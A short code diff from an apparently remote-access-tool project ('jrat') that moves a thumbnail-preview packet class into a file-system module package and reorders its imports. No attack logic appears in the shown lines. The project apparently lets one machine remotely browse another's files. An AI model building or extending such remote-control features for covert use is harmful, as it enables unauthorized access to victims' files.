@@ -1,11 +1,13 @@
-package jrat.client.packets.outgoing;
+package jrat.module.fs.packets;
 
+import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.common.io.StringWriter;
 import jrat.common.utils.ImageUtils;
+
+import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.DataOutputStream;
 import java.io.File;
-import javax.imageio.ImageIO;
 
 public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
 
